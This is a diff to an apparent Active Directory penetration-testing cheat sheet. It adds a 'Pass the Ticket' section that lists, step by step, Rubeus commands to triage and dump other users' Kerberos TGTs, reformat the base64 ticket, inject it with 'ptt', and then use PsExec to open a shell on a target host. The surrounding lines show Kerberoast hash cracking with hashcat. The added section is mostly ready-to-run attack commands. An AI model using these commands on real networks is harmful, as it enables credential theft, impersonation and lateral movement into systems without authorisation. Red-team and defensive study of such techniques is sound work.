@@ -141,6 +141,25 @@ OR Rubeus
 * And finally, crack the hash
 `hashcat -a -m 13100 SPN.hash /wordlists/rockyou.txt`
 
+## Pass the Ticket
+
+1. Perform triage with Rubeus: `.\Rubeus.exe triage`
+2. see which tickets provide access to tgt
+3. Dump these tickets with Rubeus: `.\Rubeus.exe dump /user:user_that_accessed_tgt`
+4. Copy base64TGT and convert it to a single line string:
+```
+Windows:
+$base64RubeusTGT=$(Get-Content ./tgt.txt) # where tgt.txt contains unstructured base64
+$base64RubeusTGT.Replace(" ","").replace("`n","")
+
+Linux:
+tr -d '\n' < tgt.txt | tr -d ' '
+
+```
+5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
+6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
+
+
 ## Hash cracking
 
 * in most cases pass the hash attack is better as it does not waste time
